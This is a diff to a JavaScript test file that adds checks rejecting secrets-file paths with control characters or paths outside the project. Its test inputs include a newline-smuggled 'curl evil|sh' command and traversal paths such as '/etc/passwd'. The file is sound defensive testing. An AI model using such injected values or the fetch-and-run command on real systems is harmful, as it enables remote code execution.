@@ -166,6 +166,13 @@ describe('checkedContent', () => {
       expect(() => checkedContent({ ...content(), testEnvironments })).toThrow('Invalid test environments');
     }
   });
+
+  it('refuses a secrets file path with control characters', () => {
+    for (const envFile of ['a\ncurl evil|sh', '.env\r', '.env\0', 42]) {
+      expect(() => checkedContent({ ...content(), testEnvironments: [{ envFile }] })).toThrow('Invalid test environments');
+    }
+    expect(() => checkedContent({ ...content(), testEnvironments: [{ envFile: './.env' }, { envFile: null }, {}] })).not.toThrow();
+  });
 });
 
 describe('mergeCfbsJson', () => {
@@ -259,7 +266,7 @@ describe('test environments file', () => {
   });
 
   it('lists only secrets files inside the project', async () => {
-    const envFiles = ['./.env', '.env', 'secrets/hub.env', '../outside.env', '/etc/passwd', '.', '  ', 'a/../../x.env'];
+    const envFiles = ['./.env', '.env', 'secrets/hub.env', '../outside.env', '/etc/passwd', '.', '  ', 'a/../../x.env', 'a\ncurl evil|sh'];
     await writeTestEnvironments(
       temp,
       envFiles.map(envFile => ({ envFile }))
